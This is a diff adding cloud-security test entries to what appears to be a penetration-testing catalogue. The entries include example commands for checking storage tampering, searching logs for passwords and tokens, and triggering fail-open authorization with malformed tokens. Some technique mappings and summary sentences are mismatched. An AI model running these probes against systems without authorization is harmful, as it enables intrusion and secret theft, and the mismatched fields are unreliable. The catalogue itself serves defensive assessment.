+    "Where authorized, tamper with a test object and check for detection.",
+    "Assess the impact of undetected tampering (config, artifacts, content).",
+    "Document the integrity-verification gap."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to test cloud-storage integrity.",
+    "Map stored objects the application relies on.",
+    "Assess integrity verification and overwrite protection.",
+    "Tamper with a test object and observe whether it is detected.",
+    "Assess the impact of the tampering.",
+    "Document the integrity gap."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Check versioning/object-lock",
+     "command": "aws s3api get-bucket-versioning --bucket <bucket> ; aws s3api get-object-lock-configuration --bucket <bucket>"
+    },
+    {
+     "label": "Tamper with a test object",
+     "command": "# overwrite a benign test object and check whether the app detects the change"
+    },
+    {
+     "label": "Assess integrity verification",
+     "command": "# does the app verify a checksum/ETag on retrieval, or trust the object?"
+    },
+    {
+     "label": "Assess overwrite permissions",
+     "command": "# who can write/overwrite objects the app depends on?"
+    }
+   ],
+   "variants": [
+    "Config object tampered without detection.",
+    "Artifact/data poisoned in storage.",
+    "No versioning/object-lock protecting objects.",
+    "Retrieval without integrity verification."
+   ],
+   "mitigation": [
+    "Verify object integrity on retrieval (checksums/ETags/signatures).",
+    "Enable versioning and object-lock for critical objects.",
+    "Restrict write/overwrite permissions to least privilege.",
+    "Sign critical artifacts and verify signatures before use.",
+    "Monitor and alert on unexpected object modifications.",
+    "Treat stored data integrity as a design requirement."
+   ],
+   "mitigationClientFacing": "Apps that store files or data in cloud storage should check they haven't been tampered with when reading them back. Without that check, an attacker who can write to the storage can alter a config or file and the app won't notice. The fix is to verify data integrity when retrieving it, keep version history and locks on important objects, and tightly control who can overwrite them.",
+   "reference": {
+    "standard": "A08:2025 - Software or Data Integrity Failures",
+    "cwe": "CWE-353",
+    "tools": [
+     "AWS CLI",
+     "cosign",
+     "ScoutSuite"
+    ],
+    "links": [
+     "A08:2025 - Software or Data Integrity Failures",
+     "MITRE ATT&CK T1565.001 (Stored Data Manipulation)",
+     "MITRE ATT&CK T1530 (Data from Cloud Storage)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A08",
+   "categoryName": "Software or Data Integrity Failures",
+   "attack": [
+    {
+     "id": "T1200",
+     "name": "Hardware Additions",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IAM",
+     "name": "Identity and Access Management"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-6",
+     "name": "Access Control Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "AC",
+     "name": "Access Control"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-055",
+   "domain": "CLOUD",
+   "title": "Cloud Audit Logging (CloudTrail/Activity Log) Disabled or Incomplete",
+   "sequence": 768,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-778",
+   "prerequisites": "Read access to review cloud audit-logging configuration and authorization to assess. Cloud CLI.",
+   "whatItIs": "Cloud providers offer audit logs (AWS CloudTrail, Azure Activity Log, GCP Audit Logs) recording API/control-plane activity — essential for detecting and investigating attacks. If audit logging is disabled, incomplete (missing regions/services/data events), or not retained, cloud activity goes unrecorded. This tests cloud audit-logging coverage.",
+   "rootCause": "Audit logging requires configuration (all regions, management and data events, retention) that is often incomplete, so significant activity is not logged.",
+   "impact": "Without complete audit logs, an attacker's cloud API activity — credential use, resource creation, data access — leaves no trace, crippling detection and incident response in the cloud.",
+   "realWorldContext": "Incomplete or disabled cloud audit logging repeatedly leaves responders blind during cloud incidents — missing a region, or data-plane events, means the attacker's actions were never recorded. Enabling comprehensive, retained audit logging is foundational cloud security.",
+   "difficulty": "Beginner",
+   "timeEstimate": "30-60 min",
+   "stepsToIdentify": [
+    "Assess whether cloud audit logging is enabled across all accounts/regions.",
+    "Check coverage of management and data events.",
+    "Assess log retention and protection (immutability).",
+    "Verify whether logs reach a central, monitored store.",
+    "Test whether a benign API action is recorded.",
+    "Document the audit-logging coverage gaps."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to review audit-logging configuration.",
+    "Assess audit-logging enablement, coverage, and retention.",
+    "Identify gaps (regions, services, data events).",
+    "Perform a benign API action and confirm it is logged.",
+    "Assess centralization and protection of logs.",
+    "Document the coverage gaps."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Check CloudTrail status/coverage",
+     "command": "aws cloudtrail describe-trails ; aws cloudtrail get-trail-status --name <trail>"
+    },
+    {
+     "label": "Check multi-region and data events",
+     "command": "aws cloudtrail get-event-selectors --trail-name <trail>   # data events included?"
+    },
+    {
+     "label": "Assess retention/immutability",
+     "command": "# is the log store retained and protected (object-lock) from tampering?"
+    },
+    {
+     "label": "Confirm an action is logged",
+     "command": "# perform a benign API action and confirm it appears in the audit log"
+    }
+   ],
+   "variants": [
+    "Audit logging disabled in some regions.",
+    "Data-plane events not logged.",
+    "Short/no retention of audit logs.",
+    "Logs not centralized or protected."
+   ],
+   "mitigation": [
+    "Enable comprehensive audit logging across all accounts and regions.",
+    "Include management and relevant data events.",
+    "Centralize logs in a protected, immutable store with retention.",
+    "Forward to a SIEM and build detection use-cases.",
+    "Monitor for logging being disabled/tampered.",
+    "Review audit-logging coverage regularly."
+   ],
+   "mitigationClientFacing": "Cloud providers can record everything done in your cloud account, which is essential for spotting and investigating attacks — but this logging is often turned off, incomplete, or not kept. The fix is to enable full audit logging across all regions and services, store it securely with enough history, send it to your security monitoring, and alert if someone tries to turn it off.",
+   "reference": {
+    "standard": "A09:2025 - Security Logging and Alerting Failures",
+    "cwe": "CWE-778",
+    "tools": [
+     "AWS CLI",
+     "ScoutSuite",
+     "Prowler"
+    ],
+    "links": [
+     "A09:2025 - Security Logging and Alerting Failures",
+     "MITRE ATT&CK T1562.008 (Disable Cloud Logs)",
+     "MITRE ATT&CK T1078.004 (Cloud Accounts)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A09",
+   "categoryName": "Security Logging and Alerting Failures",
+   "attack": [
+    {
+     "id": "T1685.002",
+     "name": "Disable or Modify Cloud Log",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "LOG",
+     "name": "Logging and Monitoring"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-8",
+     "name": "Audit Log Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "AU",
+     "name": "Audit and Accountability"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-056",
+   "domain": "CLOUD",
+   "title": "No Alerting on Suspicious Cloud Activity",
+   "sequence": 769,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-778",
+   "prerequisites": "Read access to review cloud alerting/detection configuration and authorization to assess. Cloud CLI.",
+   "whatItIs": "Cloud audit logs are only useful if suspicious activity generates alerts — root/privileged use, IAM changes, disabled logging, unusual data access, or new resources in unexpected regions. If there is no alerting on such activity, attacks proceed unnoticed. This tests cloud alerting/detection coverage.",
+   "rootCause": "Logging is enabled but detection use-cases and alerts are not built, and native detection services (GuardDuty/Defender) are not enabled or tuned, so suspicious activity is not surfaced.",
+   "impact": "Without alerting, an attacker's suspicious cloud activity — privilege escalation, data exfiltration, resource abuse — proceeds unnoticed, extending dwell time and delaying response.",
+   "realWorldContext": "Cloud breaches often unfold over days precisely because no alerts fired on the tell-tale activity (IAM changes, disabled logging, mass data access). Building detection use-cases and enabling native threat detection is what turns logs into timely response.",
+   "difficulty": "Beginner",
+   "timeEstimate": "30-60 min",
+   "stepsToIdentify": [
+    "Assess whether alerts exist for suspicious cloud activity (root use, IAM changes, disabled logging, unusual access).",
+    "Check whether native threat detection (GuardDuty/Defender/SCC) is enabled and tuned.",
+    "Assess whether alerts reach a monitored channel.",
+    "Test whether a benign suspicious action would alert.",
+    "Assess response integration.",
+    "Document the alerting/detection gaps."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to review cloud alerting.",
+    "Assess detection use-cases and native threat-detection services.",
+    "Perform a benign suspicious action (e.g. a benign IAM change) and check for an alert.",
+    "Assess alert delivery and response.",
+    "Identify coverage gaps.",
+    "Document the alerting gaps."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Check native threat detection",
+     "command": "aws guardduty list-detectors ; # or Azure Defender / GCP Security Command Center status"
+    },
+    {
+     "label": "Assess alerting use-cases",
+     "command": "# are there alerts for root use, IAM changes, disabled logging, unusual data access?"
+    },
+    {
+     "label": "Generate a benign suspicious action (in scope)",
+     "command": "# e.g. a benign IAM policy change; does it alert?"
+    },
+    {
+     "label": "Check alert delivery",
+     "command": "# do alerts reach a monitored channel (SIEM/SOC)?"
+    }
+   ],
+   "variants": [
+    "No alerting on IAM/privilege changes.",
+    "Native threat detection disabled.",
+    "Disabled-logging events not alerting.",
+    "Unusual data access not flagged."
+   ],
+   "mitigation": [
+    "Enable and tune native cloud threat detection (GuardDuty/Defender/SCC).",
+    "Build detection use-cases (root use, IAM changes, disabled logging, data exfil).",
+    "Route alerts to a monitored channel with response playbooks.",
+    "Alert on logging being disabled/tampered.",
+    "Test detection with benign suspicious actions.",
+    "Review alerting coverage regularly."
+   ],
+   "mitigationClientFacing": "Cloud logs only help if something raises an alarm when suspicious things happen — like someone changing permissions, turning off logging, or accessing lots of data. Without alerts, attacks go unnoticed. The fix is to turn on the cloud's built-in threat detection, create alerts for suspicious activity, send them to your security team, and test that they work. The outcome is that publicly reachable services expose only what they must, shrinking the surface an attacker can even attempt to probe.",
+   "reference": {
+    "standard": "A09:2025 - Security Logging and Alerting Failures",
+    "cwe": "CWE-778",
+    "tools": [
+     "AWS CLI",
+     "GuardDuty",
+     "Prowler",
+     "ScoutSuite"
+    ],
+    "links": [
+     "A09:2025 - Security Logging and Alerting Failures",
+     "MITRE ATT&CK T1078.004 (Cloud Accounts)",
+     "MITRE ATT&CK T1562.008 (Disable Cloud Logs)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A09",
+   "categoryName": "Security Logging and Alerting Failures",
+   "attack": [
+    {
+     "id": "T1685.002",
+     "name": "Disable or Modify Cloud Log",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "LOG",
+     "name": "Logging and Monitoring"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-8",
+     "name": "Audit Log Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "AU",
+     "name": "Audit and Accountability"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-057",
+   "domain": "CLOUD",
+   "title": "Sensitive Data Exposed in Cloud Logs",
+   "sequence": 770,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-532",
+   "prerequisites": "Read access to cloud logs (CloudWatch/Log Analytics) and authorization to review. Cloud CLI.",
+   "whatItIs": "Applications and services write to cloud logging (CloudWatch Logs, Azure Monitor, Cloud Logging). If they log sensitive data — credentials, tokens, PII, full requests — anyone with log-read access (a broad set of principals) can retrieve it. This tests for sensitive data exposed in cloud logs.",
+   "rootCause": "Verbose/request logging captures sensitive fields without redaction, and log-read access is often broad, so sensitive values are exposed to many principals.",
+   "impact": "Sensitive data in cloud logs grants an attacker (or over-privileged principal) credentials, tokens, and PII from the logging service, enabling account access and data exposure.",
+   "realWorldContext": "Credentials and PII written to cloud logs are a common finding, and log access is often granted broadly — so a low-privilege principal reads secrets from the logs. Redacting sensitive data and restricting log access is the fix.",
+   "difficulty": "Beginner",
+   "timeEstimate": "30-60 min",
+   "stepsToIdentify": [
+    "Identify what applications/services log to cloud logging.",
+    "Search logs for credentials, tokens, PII, and full requests.",
+    "Assess whether sensitive data is redacted.",
+    "Assess who can read the logs (log-access permissions).",
+    "Assess retention of sensitive log data.",
+    "Document the sensitive-data-in-logs exposure."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to review cloud logs.",
+    "Search log groups for sensitive values.",
+    "Assess redaction and log verbosity.",
+    "Assess log-read permissions breadth.",
+    "Show that recoverable sensitive data provides value to an attacker.",
+    "Document the exposure."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Search logs for secrets",
+     "command": "aws logs filter-log-events --log-group-name <group> --filter-pattern 'password' ; # also token, ssn, Authorization"
+    },
+    {
+     "label": "Assess redaction/verbosity",
+     "command": "# are sensitive fields redacted; is full request/response logged?"
+    },
+    {
+     "label": "Assess log-read access",
+     "command": "# who has logs:GetLogEvents / read access to the log groups?"
+    },
+    {
+     "label": "Check retention",
+     "command": "aws logs describe-log-groups --query 'logGroups[].retentionInDays'"
+    }
+   ],
+   "variants": [
+    "Credentials/tokens in application logs.",
+    "PII logged without redaction.",
+    "Full request/response logging including secrets.",
+    "Broad log-read access to sensitive logs."
+   ],
+   "mitigation": [
+    "Never log credentials, tokens, or sensitive PII; redact sensitive fields.",
+    "Reduce log verbosity; avoid logging full requests with secrets.",
+    "Restrict log-read access to least privilege.",
+    "Set appropriate retention and consider log-data classification.",
+    "Scan logs for sensitive data and alert.",
+    "Rotate any credential exposed in logs."
+   ],
+   "mitigationClientFacing": "Apps often write logs to the cloud, and if those logs contain passwords, tokens, or personal data, anyone allowed to read the logs (often many people) can grab them. The fix is to never log sensitive information (and redact it if it slips in), reduce how much detail is logged, tightly restrict who can read the logs, and change any password found in them.",
+   "reference": {
+    "standard": "A09:2025 - Security Logging and Alerting Failures",
+    "cwe": "CWE-532",
+    "tools": [
+     "AWS CLI",
+     "CloudWatch Logs",
+     "ScoutSuite"
+    ],
+    "links": [
+     "A09:2025 - Security Logging and Alerting Failures",
+     "MITRE ATT&CK T1552.001 (Credentials In Files)",
+     "MITRE ATT&CK T1530 (Data from Cloud Storage)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A09",
+   "categoryName": "Security Logging and Alerting Failures",
+   "attack": [
+    {
+     "id": "T1552",
+     "name": "Unsecured Credentials",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "LOG",
+     "name": "Logging and Monitoring"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-8",
+     "name": "Audit Log Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "AU",
+     "name": "Audit and Accountability"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-058",
+   "domain": "CLOUD",
+   "title": "Cloud Function Fails Open on Authorization Error",
+   "sequence": 771,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-636",
+   "prerequisites": "A serverless function performing authorization and authorization to test its error handling. Burp Suite.",
+   "whatItIs": "When a cloud function's authorization check throws an error (a timeout to an auth service, a malformed token, an exception), it should fail closed (deny). If it fails open — treating an error as success or skipping the check — an attacker can trigger the error condition to bypass authorization. This tests fail-open behaviour on authorization errors.",
+   "rootCause": "Error handling in the function defaults to allowing the request (or an exception skips the deny path), so an error in the authorization check results in access rather than denial.",
+   "impact": "Fail-open authorization lets an attacker who can induce an error (malformed input, dependency timeout) bypass access control and reach protected functionality/data — a serious authorization-bypass via exceptional conditions.",
+   "realWorldContext": "Fail-open authorization is a classic exceptional-condition bug: an exception in the auth check, and the function serves the request anyway. In serverless, a dependency timeout or malformed token can trigger it, making 'fail closed on any error' an essential design rule.",
+   "difficulty": "Advanced",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Identify the function's authorization check and its error handling.",
+    "Induce error conditions (malformed token, missing claims, dependency failure).",
+    "Observe whether an error results in denial (fail closed) or access (fail open).",
+    "Test edge cases that throw exceptions in the auth path.",
+    "Assess whether the backend re-verifies authorization.",
+    "Document the fail-open behaviour."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to test the function's error handling.",
+    "Map the authorization check and its failure paths.",
+    "Induce errors in the auth check (malformed input, timeouts).",
+    "Observe whether access is granted on error.",
+    "Demonstrate authorization bypass via an induced error.",
+    "Document the fail-open flaw."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Send a malformed token to trigger an error",
+     "command": "curl -s https://<function-url>/protected -H 'Authorization: Bearer malformed.token.here'"
+    },
+    {
+     "label": "Omit expected claims",
+     "command": "# present a token missing required claims and observe allow vs deny"
+    },
+    {
+     "label": "Induce a dependency error",
+     "command": "# cause the auth-service call to fail/timeout and observe the outcome"
+    },
+    {
+     "label": "Assess the outcome",
+     "command": "# does an auth error deny (fail closed) or allow (fail open)?"
+    }
+   ],
+   "variants": [
+    "Malformed token treated as authorized.",
+    "Auth-service timeout resulting in access.",
+    "Exception skipping the deny path.",
+    "Missing-claims token allowed."
+   ],
+   "mitigation": [
+    "Fail closed: deny access on any authorization error or exception.",
+    "Handle all error paths explicitly to default to deny.",
+    "Do not treat exceptions as authorization success.",
+    "Add timeouts and safe defaults for auth-service dependencies.",
+    "Re-verify authorization at the backend where possible.",
+    "Test authorization under induced error conditions."
+   ],
+   "mitigationClientFacing": "When a cloud function checks if you're allowed to do something and that check hits an error, it should deny access to be safe. If instead it lets the request through when there's an error, an attacker can deliberately cause an error to bypass the check. The fix is to always deny access whenever the permission check fails or errors, and to test this by deliberately causing errors.",
+   "reference": {
+    "standard": "A10:2025 - Mishandling of Exceptional Conditions",
+    "cwe": "CWE-636",
+    "tools": [
+     "Burp Suite",
+     "curl",
+     "jwt_tool"
+    ],
+    "links": [
+     "A10:2025 - Mishandling of Exceptional Conditions",
+     "MITRE ATT&CK T1078 (Valid Accounts)",
+     "OWASP WSTG-ATHZ (Authorization)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A10",
+   "categoryName": "Mishandling of Exceptional Conditions",
+   "attack": [
+    {
+     "id": "T1550.001",
+     "name": "Application Access Token",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IAM",
+     "name": "Identity and Access Management"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-6",
+     "name": "Access Control Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "IA",
+     "name": "Identification and Authentication"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-059",
+   "domain": "CLOUD",
+   "title": "Unhandled Exceptions Leak Cloud Internals in API Responses",
+   "sequence": 772,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-209",
+   "prerequisites": "A cloud API/function and authorization to send malformed requests. Burp Suite.",
+   "whatItIs": "Cloud APIs and functions that do not handle exceptions gracefully may return internal detail in error responses — stack traces, cloud resource identifiers, internal endpoints, environment detail. This aids an attacker in mapping the cloud environment. This tests for internal information leakage via unhandled exceptions.",
+   "rootCause": "Debug/verbose error handling is left enabled, so unhandled exceptions return internal cloud detail to the client instead of a generic error.",
+   "impact": "Leaked cloud internals (resource IDs, internal endpoints, environment/config detail, stack traces) help an attacker map and target the cloud environment, accelerating further attacks.",
+   "realWorldContext": "Verbose cloud error responses have leaked internal endpoints, resource identifiers, and even environment detail that maps the cloud environment for an attacker. Returning generic errors and logging detail server-side is the fix.",
+   "difficulty": "Beginner",
+   "timeEstimate": "15-30 min",
+   "stepsToIdentify": [
+    "Send malformed/edge-case requests to cloud API/function endpoints.",
+    "Observe error responses for stack traces, resource IDs, and internal detail.",
+    "Trigger unhandled exceptions with unexpected input.",
+    "Assess what cloud internals are revealed.",
+    "Check whether debug mode appears enabled.",
+    "Document the information leakage."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to send malformed requests.",
+    "Submit malformed/edge-case input to endpoints.",
+    "Collect verbose error responses and the internals they reveal.",
+    "Assess how leaked detail aids environment mapping.",
+    "Document the exception-handling leakage."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Send malformed input",
+     "command": "curl -s https://<function-url>/api -H 'Content-Type: application/json' -d '{malformed'"
+    },
+    {
+     "label": "Trigger a type error",
+     "command": "curl -s https://<function-url>/api -d '{\"count\":\"not-a-number\"}'"
+    },
+    {
+     "label": "Assess leaked internals",
+     "command": "# note stack traces, cloud resource IDs, internal endpoints, env detail in the error"
+    },
+    {
+     "label": "Check debug mode",
+     "command": "# does the response indicate a debug/verbose configuration?"
+    }
+   ],
+   "variants": [
+    "Stack trace revealing internal structure.",
+    "Cloud resource identifiers leaked.",
+    "Internal endpoints/config disclosed.",
+    "Environment detail exposed in errors."
+   ],
+   "mitigation": [
+    "Handle exceptions gracefully; return generic error responses.",
+    "Disable debug/verbose errors in production.",
+    "Log detailed errors server-side only.",
+    "Avoid including cloud internals in client responses.",
+    "Standardize error handling across functions/APIs.",
+    "Test error handling with malformed input."
+   ],
+   "mitigationClientFacing": "When something goes wrong, a cloud API can accidentally send back internal details — error traces, internal addresses, cloud resource names — that help an attacker map your environment. The fix is to handle errors cleanly, return only simple generic messages to users, and keep the detailed information in server logs. This prevents a single unexpected failure from cascading into an outage or, worse, into a state where security controls quietly stop being enforced.",
+   "reference": {
+    "standard": "A10:2025 - Mishandling of Exceptional Conditions",
+    "cwe": "CWE-209",
+    "tools": [
+     "Burp Suite",
+     "curl",
+     "Postman"
+    ],
+    "links": [
+     "A10:2025 - Mishandling of Exceptional Conditions",
+     "MITRE ATT&CK T1592 (Gather Victim Host Information)",
+     "OWASP WSTG-ERRH-01 (Error Handling)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A10",
+   "categoryName": "Mishandling of Exceptional Conditions",
+   "attack": [
+    {
+     "id": "T1078.004",
+     "name": "Cloud Accounts",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IVS",
+     "name": "Infrastructure and Virtualization Security"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-4",
+     "name": "Secure Configuration of Enterprise Assets and Software"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "CM",
+     "name": "Configuration Management"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-060",
+   "domain": "CLOUD",
+   "title": "Resource Exhaustion via Unbounded Cloud Operation on Error/Retry",
+   "sequence": 773,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-400",
+   "prerequisites": "A cloud application/function with retry or recursive behaviour, and authorization to test. A scripting environment.",
+   "whatItIs": "Cloud systems often retry failed operations, and functions can invoke other functions. If error/retry handling is unbounded — infinite retries, recursive invocation, or amplification on failure — an attacker (or a fault) can exhaust resources and inflate cost, a denial-of-service/denial-of-wallet via exceptional conditions. This tests bounded error/retry handling.",
+   "rootCause": "Retry and invocation logic lacks limits (max retries, backoff, recursion depth, concurrency caps), so an error condition triggers unbounded resource consumption.",
+   "impact": "Unbounded retry/recursion on error can exhaust concurrency/quota (denial of service) and inflate cost (denial of wallet), amplifying a single fault or malicious trigger into a large impact.",
+   "realWorldContext": "Recursive serverless invocation and unbounded retries have caused real runaway-cost and outage incidents — a function invoking itself on error, or infinite retries amplifying a fault. Bounding retries, recursion, and concurrency is the fix.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Identify retry, recursion, and cross-function-invocation behaviour.",
+    "Assess whether limits exist (max retries, backoff, recursion depth, concurrency caps).",
+    "Induce an error/failure that triggers retry/recursion.",
+    "Observe whether consumption is bounded or amplifies (within authorized limits).",
+    "Assess cost/quota impact.",
+    "Document the unbounded error-handling exposure."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to test retry/recursion within agreed limits.",
+    "Map retry/recursion/invocation behaviour and its limits.",
+    "Induce a failure to trigger the behaviour.",
+    "Observe whether consumption is bounded (within authorized limits).",
+    "Assess the cost/availability impact.",
+    "Document the unbounded-handling flaw."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Induce a failure to trigger retries",
+     "command": "# cause a downstream failure and observe retry count/backoff"
+    },
+    {
+     "label": "Test recursion/amplification",
+     "command": "# trigger a path where a function invokes another/itself on error and observe amplification"
+    },
+    {
+     "label": "Assess limits",
+     "command": "# are max retries, backoff, recursion depth, and concurrency caps configured?"
+    },
+    {
+     "label": "Assess cost/quota impact",
+     "command": "# does the behaviour approach concurrency/quota limits or inflate cost?"
+    }
+   ],
+   "variants": [
+    "Infinite/excessive retries on failure.",
+    "Recursive function invocation amplifying on error.",
+    "No concurrency cap enabling exhaustion.",
+    "No backoff causing retry storms."
+   ],
+   "mitigation": [
+    "Bound retries with limits and exponential backoff.",
+    "Cap recursion depth and prevent self-invocation loops.",
+    "Set concurrency limits and reserved capacity.",
+    "Use dead-letter queues for repeatedly-failing operations.",
+    "Add budget/quota alerts for runaway consumption.",
+    "Test error/retry paths for bounded behaviour."
+   ],
+   "mitigationClientFacing": "Cloud systems retry failed operations and can trigger each other, and if there are no limits, an error can spiral into endless retries or runaway function calls — causing outages and huge bills. The fix is to set limits: a maximum number of retries with waits between them, caps on how deep function calls can go, and concurrency limits — plus budget alerts to catch runaway consumption.",
+   "reference": {
+    "standard": "A10:2025 - Mishandling of Exceptional Conditions",
+    "cwe": "CWE-400",
+    "tools": [
+     "custom scripts",
+     "cloud CLI",
+     "budget alerts"
+    ],
+    "links": [
+     "A10:2025 - Mishandling of Exceptional Conditions",
+     "MITRE ATT&CK T1499 (Endpoint Denial of Service)",
+     "MITRE ATT&CK T1496 (Resource Hijacking)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A10",
+   "categoryName": "Mishandling of Exceptional Conditions",
+   "attack": [
+    {
+     "id": "T1499",
+     "name": "Endpoint Denial of Service",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IVS",
+     "name": "Infrastructure and Virtualization Security"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-13",
+     "name": "Network Monitoring and Defense"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SC",
+     "name": "System and Communications Protection"
+    }
+   ]
   }
  ]
 }
